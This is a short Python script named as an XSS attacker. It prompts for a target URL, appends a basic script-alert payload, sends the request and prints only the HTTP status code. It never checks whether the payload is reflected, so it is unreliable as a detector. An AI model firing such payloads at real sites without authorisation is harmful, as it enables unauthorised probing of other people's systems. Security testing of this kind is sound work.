# xss_injection/xss_attacker.py
import requests

def run_xss_attacker():
    print("\n=== XSS Injection ===")
    url = input("Enter target URL (e.g., http://example.com/search?q=): ")
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + payload)
    print(f"Response status code: {response.status_code}")
